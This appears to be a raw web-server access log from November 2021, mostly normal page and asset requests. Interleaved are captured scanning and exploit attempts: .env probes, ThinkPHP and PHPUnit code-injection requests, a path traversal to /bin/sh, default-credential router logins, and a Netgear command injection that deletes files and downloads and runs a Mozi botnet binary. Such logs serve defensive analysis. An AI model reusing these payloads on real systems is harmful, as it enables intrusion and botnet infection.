34.105.219.249 - - [08/Nov/2021 08:24:38] "GET /font/fonts/fontawesome-webfont.eot HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/3.png HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/2.png HTTP/1.1" 200 -
205.228.82.171 - - [08/Nov/2021 08:24:38] "GET /images/1.png HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:39] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:39] "GET /font/fonts/fontawesome-webfont.ttf?v=4.0.3 HTTP/1.1" 200 -
34.105.219.249 - - [08/Nov/2021 08:24:41] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
205.169.39.165 - - [08/Nov/2021 08:27:22] "GET / HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:22] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/jquery.nav.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:23] "GET /js/waypoints.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /js/custom.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /images/work/1.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /images/work/2.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /images/work/3.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:24] "GET /images/work/4.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:25] "GET /images/work/5.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:25] "GET /images/work/6.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:25] "GET /images/work/7.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:25] "GET /images/work/8.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET / HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /css/isotope.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /css/animate.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /css/styles.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/jquery.nav.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/5.png HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/1.png HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/2.png HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/3.png HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/logo.png HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/waypoints.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/custom.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/about-img.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/work/1.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/work/2.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:28] "GET /images/work/3.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/work/4.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/work/5.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/work/6.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/work/7.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/work/8.jpg HTTP/1.1" 200 -
205.169.39.165 - - [08/Nov/2021 08:27:29] "GET /images/links-arrow.png HTTP/1.1" 200 -
69.162.231.50 - - [08/Nov/2021 08:38:21] "[33mGET /.env HTTP/1.1[0m" 404 -
69.162.231.50 - - [08/Nov/2021 08:38:21] "[31m[1mPOST / HTTP/1.1[0m" 405 -
65.154.226.165 - - [08/Nov/2021 08:58:58] "GET / HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /css/bootstrap.min.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /css/isotope.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /js/fancybox/jquery.fancybox.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /css/animate.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /js/owl-carousel/owl.carousel.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /css/styles.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /font/css/font-awesome.min.css HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /js/modernizr-latest.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/2.png HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/banner-bg2.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/1.png HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/3.png HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/banner-bg.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/banner-bg3.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/logo.png HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:58:59] "GET /images/5.png HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /images/about-img.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/jquery-1.8.2.min.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/bootstrap.min.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/jquery.isotope.min.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/jquery.nav.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/jquery.fittext.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/waypoints.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/custom.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /js/owl-carousel/owl.carousel.js HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /images/work/1.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /images/work/2.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /images/work/3.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:00] "GET /images/work/4.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:01] "GET /images/work/5.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:01] "GET /images/work/6.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:01] "GET /images/work/7.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:01] "GET /images/work/8.jpg HTTP/1.1" 200 -
65.154.226.165 - - [08/Nov/2021 08:59:01] "GET /images/links-arrow.png HTTP/1.1" 200 -
165.232.86.149 - - [08/Nov/2021 09:09:06] "[33mGET /.env HTTP/1.1[0m" 404 -
165.232.86.149 - - [08/Nov/2021 09:09:07] "[31m[1mPOST / HTTP/1.1[0m" 405 -
45.146.164.110 - - [08/Nov/2021 09:32:55] "[31m[1mPOST /api/jsonws/invoke HTTP/1.1[0m" 405 -
45.146.164.110 - - [08/Nov/2021 09:32:55] "[31m[1mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 405 -
45.146.164.110 - - [08/Nov/2021 09:32:56] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:56] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:57] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:57] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 -
45.146.164.110 - - [08/Nov/2021 09:32:57] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
45.146.164.110 - - [08/Nov/2021 09:32:58] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:58] "[33mGET /console/ HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:58] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.146.164.110 - - [08/Nov/2021 09:32:58] "GET / HTTP/1.1" 200 -
45.146.164.110 - - [08/Nov/2021 09:32:59] "[31m[1mPOST /cgi-bin/../../../../bin/sh HTTP/1.1[0m" 405 -
45.146.164.110 - - [08/Nov/2021 09:32:59] "[31m[1mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 405 -
45.146.164.110 - - [08/Nov/2021 09:33:00] "GET / HTTP/1.1" 200 -
180.149.125.173 - - [08/Nov/2021 09:36:13] "GET / HTTP/1.1" 200 -
186.33.87.251 - - [08/Nov/2021 10:37:29] "GET / HTTP/1.1" 200 -
186.33.87.251 - - [08/Nov/2021 10:37:29] "GET / HTTP/1.1" 200 -
161.35.212.57 - - [08/Nov/2021 11:11:09] "[33mGET /.env HTTP/1.1[0m" 404 -
161.35.212.57 - - [08/Nov/2021 11:11:11] "[31m[1mPOST / HTTP/1.1[0m" 405 -
89.248.165.210 - - [08/Nov/2021 11:29:08] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
89.248.165.210 - - [08/Nov/2021 11:29:08] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
34.140.248.32 - - [08/Nov/2021 11:56:12] "GET / HTTP/1.1" 200 -
34.78.120.99 - - [08/Nov/2021 12:12:11] "GET / HTTP/1.1" 200 -
41.77.22.107 - - [08/Nov/2021 13:50:53] "GET / HTTP/1.1" 200 -
100.27.14.230 - - [08/Nov/2021 14:04:32] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.27.14.230 - - [08/Nov/2021 14:04:32] "[33mGET /.env HTTP/1.1[0m" 404 -
223.237.233.161 - - [08/Nov/2021 14:17:26] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [08/Nov/2021 14:17:26] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:26] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:27] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /images/banner-bg.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /images/banner-bg2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /font/fonts/fontawesome-webfont.woff?v=4.0.3 HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:28] "[36mGET /images/5.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/2.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/banner-bg3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/3.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/1.png HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/about-img.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/work/1.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/work/2.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/work/3.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/work/4.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:29] "[36mGET /images/work/5.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:30] "[36mGET /images/work/6.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:30] "[36mGET /images/work/7.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:30] "[36mGET /images/work/8.jpg HTTP/1.1[0m" 304 -
223.237.233.161 - - [08/Nov/2021 14:17:30] "[36mGET /images/links-arrow.png HTTP/1.1[0m" 304 -
161.35.212.57 - - [08/Nov/2021 14:20:27] "[33mGET /.env HTTP/1.1[0m" 404 -
161.35.212.57 - - [08/Nov/2021 14:20:28] "[31m[1mPOST / HTTP/1.1[0m" 405 -
119.189.136.206 - - [08/Nov/2021 15:07:12] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0[0m" 404 -
192.241.210.231 - - [08/Nov/2021 15:48:46] "GET / HTTP/1.1" 200 -
100.25.160.83 - - [08/Nov/2021 16:00:23] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [08/Nov/2021 16:00:23] "[33mGET /.env HTTP/1.1[0m" 404 -
193.118.53.194 - - [08/Nov/2021 16:07:47] "GET / HTTP/1.1" 200 -
135.125.246.189 - - [08/Nov/2021 16:17:33] "[31m[1mPOST / HTTP/1.1[0m" 405 -
135.125.246.189 - - [08/Nov/2021 16:17:33] "[33mGET /.env HTTP/1.1[0m" 404 -
159.203.18.202 - - [08/Nov/2021 17:14:30] "[33mGET /.env HTTP/1.1[0m" 404 -
159.203.18.202 - - [08/Nov/2021 17:14:31] "[31m[1mPOST / HTTP/1.1[0m" 405 -
209.141.62.185 - - [08/Nov/2021 17:59:14] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
100.25.160.83 - - [08/Nov/2021 18:04:04] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [08/Nov/2021 18:04:04] "[33mGET /.env HTTP/1.1[0m" 404 -
138.255.222.170 - - [08/Nov/2021 18:15:20] "GET / HTTP/1.1" 200 -
34.220.135.83 - - [08/Nov/2021 18:33:59] "[33mGET /.env HTTP/1.1[0m" 404 -
34.220.135.83 - - [08/Nov/2021 18:33:59] "[31m[1mPOST / HTTP/1.1[0m" 405 -
180.149.125.167 - - [08/Nov/2021 18:46:55] "GET / HTTP/1.1" 200 -
213.91.96.33 - - [08/Nov/2021 18:52:08] "GET / HTTP/1.1" 200 -
135.125.246.189 - - [08/Nov/2021 19:19:45] "[31m[1mPOST / HTTP/1.1[0m" 405 -
135.125.246.189 - - [08/Nov/2021 19:19:46] "[33mGET /.env HTTP/1.1[0m" 404 -
104.248.117.193 - - [08/Nov/2021 19:26:14] "[33mGET /.env HTTP/1.1[0m" 404 -
104.248.117.193 - - [08/Nov/2021 19:26:15] "[31m[1mPOST / HTTP/1.1[0m" 405 -
120.85.114.213 - - [08/Nov/2021 19:38:43] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
100.25.160.83 - - [08/Nov/2021 20:06:13] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [08/Nov/2021 20:06:13] "[33mGET /.env HTTP/1.1[0m" 404 -
143.110.234.82 - - [08/Nov/2021 20:24:59] "[33mGET /.env HTTP/1.1[0m" 404 -
143.110.234.82 - - [08/Nov/2021 20:24:59] "[31m[1mPOST / HTTP/1.1[0m" 405 -
209.141.56.209 - - [08/Nov/2021 20:28:26] "GET / HTTP/1.1" 200 -
161.35.212.57 - - [08/Nov/2021 20:32:03] "[33mGET /.env HTTP/1.1[0m" 404 -
161.35.212.57 - - [08/Nov/2021 20:32:05] "[31m[1mPOST / HTTP/1.1[0m" 405 -
45.71.167.35 - - [08/Nov/2021 21:04:34] "GET / HTTP/1.1" 200 -
34.220.135.83 - - [08/Nov/2021 21:04:36] "[33mGET /.env HTTP/1.1[0m" 404 -
34.220.135.83 - - [08/Nov/2021 21:04:37] "[31m[1mPOST / HTTP/1.1[0m" 405 -
128.14.209.162 - - [08/Nov/2021 21:44:01] "GET / HTTP/1.1" 200 -
100.25.160.83 - - [08/Nov/2021 22:11:22] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [08/Nov/2021 22:11:22] "[33mGET /.env HTTP/1.1[0m" 404 -
135.125.246.189 - - [08/Nov/2021 22:23:37] "[31m[1mPOST / HTTP/1.1[0m" 405 -
135.125.246.189 - - [08/Nov/2021 22:23:37] "[33mGET /.env HTTP/1.1[0m" 404 -
18.234.95.44 - - [08/Nov/2021 22:28:48] "GET / HTTP/1.1" 200 -
87.251.64.141 - - [08/Nov/2021 22:37:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
87.251.64.141 - - [08/Nov/2021 22:37:14] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
137.184.197.90 - - [08/Nov/2021 22:56:21] "[33mGET /.env HTTP/1.1[0m" 404 -
137.184.197.90 - - [08/Nov/2021 22:56:21] "[31m[1mPOST / HTTP/1.1[0m" 405 -
209.17.96.106 - - [08/Nov/2021 23:09:43] "GET / HTTP/1.0" 200 -
161.35.212.57 - - [08/Nov/2021 23:23:47] "[33mGET /.env HTTP/1.1[0m" 404 -
161.35.212.57 - - [08/Nov/2021 23:23:48] "[31m[1mPOST / HTTP/1.1[0m" 405 -
167.94.138.114 - - [08/Nov/2021 23:26:01] "GET / HTTP/1.1" 200 -
167.94.138.114 - - [08/Nov/2021 23:26:01] "GET / HTTP/1.1" 200 -
222.186.19.235 - - [09/Nov/2021 00:08:18] "[33mGET http://fuwu.sogou.com/404/index.html HTTP/1.1[0m" 404 -
222.186.19.235 - - [09/Nov/2021 00:08:18] "[33mGET http://fuwu.sogou.com/404/index.html HTTP/1.1[0m" 404 -
222.186.19.235 - - [09/Nov/2021 00:08:18] code 400, message Bad request version ('iÑ]OI\x90c\x01¶G?¢Pó{)\x82b\x8b')
222.186.19.235 - - [09/Nov/2021 00:08:18] "[35m[1m î  ê¼DL¶%rÆGïïOg£Ä5»èrÃ 7@ió+iÑ]OIc¶G?¢Pó{)b[0m" HTTPStatus.BAD_REQUEST -
222.186.19.235 - - [09/Nov/2021 00:08:25] code 400, message Bad request syntax ('\x05\x01\x00')
222.186.19.235 - - [09/Nov/2021 00:08:25] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
100.25.160.83 - - [09/Nov/2021 00:12:50] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [09/Nov/2021 00:12:50] "[33mGET /.env HTTP/1.1[0m" 404 -
104.248.125.15 - - [09/Nov/2021 00:17:15] "[33mGET /.env HTTP/1.1[0m" 404 -
104.248.125.15 - - [09/Nov/2021 00:17:15] "[31m[1mPOST / HTTP/1.1[0m" 405 -
209.141.56.209 - - [09/Nov/2021 00:45:15] "GET / HTTP/1.1" 200 -
45.137.23.85 - - [09/Nov/2021 00:47:27] "GET / HTTP/1.1" 200 -
177.126.56.255 - - [09/Nov/2021 01:12:37] "GET / HTTP/1.1" 200 -
36.85.217.134 - - [09/Nov/2021 01:21:54] "GET / HTTP/1.1" 200 -
135.125.246.189 - - [09/Nov/2021 01:25:49] "[31m[1mPOST / HTTP/1.1[0m" 405 -
135.125.246.189 - - [09/Nov/2021 01:25:50] "[33mGET /.env HTTP/1.1[0m" 404 -
209.17.97.58 - - [09/Nov/2021 01:27:28] "GET / HTTP/1.1" 200 -
173.212.209.24 - - [09/Nov/2021 01:28:15] "GET / HTTP/1.1" 200 -
193.142.146.242 - - [09/Nov/2021 01:38:42] "[31m[1mPOST /boaform/admin/formLogin HTTP/1.1[0m" 405 -
100.25.160.83 - - [09/Nov/2021 02:17:17] "[31m[1mPOST / HTTP/1.1[0m" 405 -
100.25.160.83 - - [09/Nov/2021 02:17:17] "[33mGET /.env HTTP/1.1[0m" 404 -
87.251.64.141 - - [09/Nov/2021 02:32:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
87.251.64.141 - - [09/Nov/2021 02:32:18] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
3.235.140.125 - - [09/Nov/2021 02:49:49] "[33mGET /.env HTTP/1.1[0m" 404 -
3.235.140.125 - - [09/Nov/2021 02:49:49] "[31m[1mPOST / HTTP/1.1[0m" 405 -
165.232.86.149 - - [09/Nov/2021 02:54:21] "[33mGET /.env HTTP/1.1[0m" 404 -
165.232.86.149 - - [09/Nov/2021 02:54:22] "[31m[1mPOST / HTTP/1.1[0m" 405 -
143.198.120.120 - - [09/Nov/2021 03:14:19] "[33mGET /.env HTTP/1.1[0m" 404 -
143.198.120.120 - - [09/Nov/2021 03:14:19] "[31m[1mPOST / HTTP/1.1[0m" 405 -
223.237.233.161 - - [09/Nov/2021 03:21:31] "GET / HTTP/1.1" 200 -
223.237.233.161 - - [09/Nov/2021 03:21:31] "[36mGET /css/isotope.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:31] "[36mGET /css/bootstrap.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/fancybox/jquery.fancybox.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /css/animate.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/owl-carousel/owl.carousel.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /css/styles.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /font/css/font-awesome.min.css HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/modernizr-latest.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/jquery-1.8.2.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/bootstrap.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/jquery.isotope.min.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/fancybox/jquery.fancybox.pack.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/jquery.nav.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:32] "[36mGET /js/jquery.fittext.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:33] "[36mGET /js/waypoints.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:33] "[36mGET /js/custom.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:33] "[36mGET /js/owl-carousel/owl.carousel.js HTTP/1.1[0m" 304 -
223.237.233.161 - - [09/Nov/2021 03:21:33] "[36mGET /images/logo.png HTTP/1.1[0m" 304 -
